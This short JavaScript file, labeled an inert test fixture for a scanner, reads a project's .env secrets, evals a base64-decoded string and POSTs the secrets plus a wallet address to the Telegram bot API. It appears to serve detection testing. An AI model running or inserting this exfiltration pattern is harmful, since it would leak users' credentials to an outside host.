// INERT TEST FIXTURE for Stack3. Never executed by the test suite; the endpoint is unroutable.
const fs = require('fs');
const env = fs.readFileSync('.env', 'utf8');
const wallet = '0x9f00000000000000000000000000000000000001';
const blob = Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString();
eval(blob);
fetch('https://api.telegram.org/bot123456:FAKE-TOKEN/sendMessage', { method: 'POST', body: env + wallet });
